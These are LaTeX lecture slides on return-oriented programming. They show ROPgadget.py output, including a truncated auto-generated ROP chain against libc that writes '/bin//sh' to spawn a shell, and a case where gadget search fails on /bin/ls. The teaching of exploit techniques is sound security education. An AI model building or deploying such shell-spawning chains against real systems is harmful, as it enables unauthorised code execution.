
\begin{frame}{common, reusable ROP sequences}
    \begin{itemize}
        \item open a command-line
            \begin{itemize}
            \item \texttt{ROPchain.py --binary example --ropchain} tries to do this
            \end{itemize}
        \item make memory executable + jump
            \begin{itemize}
            \item generally: just do enough to ignore write XOR execute
            \end{itemize}
        \item often only depend on memory locations in shared library
    \end{itemize}
\end{frame}

\begin{frame}[fragile,label=ropchainex1]{ROPgadget.py --ropchain (works)}
\begin{lstlisting}[language={},style=script]
ROPgadget.py --binary /lib/x86_64-linux-gnu/libc.so.6 \
             --offset 0x10000000 --ropchain
...
        #!/usr/bin/env python2
        # execve generated by ROPgadget

        from struct import pack

        # Padding goes here
        p = ''
        p += pack('<Q', 0x00000000101056fd) # pop rdx ; pop rcx ; pop rbx ; ret
        p += pack('<Q', 0x00000000101eb1a0) # @ .data
        p += pack('<Q', 0x4141414141414141) # padding
        p += pack('<Q', 0x4141414141414141) # padding
        p += pack('<Q', 0x000000001004a550) # pop rax ; ret
        p += '/bin//sh'
        p += pack('<Q', 0x00000000100374b0) # mov qword ptr [rdx], rax ; ret
...
\end{lstlisting}
\end{frame}

\begin{frame}[fragile,label=ropchainex]{ROPgadget.py --ropchain (does not work?)}
\begin{lstlisting}[language={},style=script]
ROPgadget.py --binary /bin/ls --ropchain
...
ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

        [+] Gadget found: 0x7694 mov byte ptr [rax], 0xa ; pop rbx ; pop rbp ; pop r12 ; ret
        [-] Can't find the 'pop rax' gadget. Try with another 'mov [reg], reg'

        [-] Can't find the 'mov qword ptr [r64], r64' gadget
...
\end{lstlisting}
\end{frame}
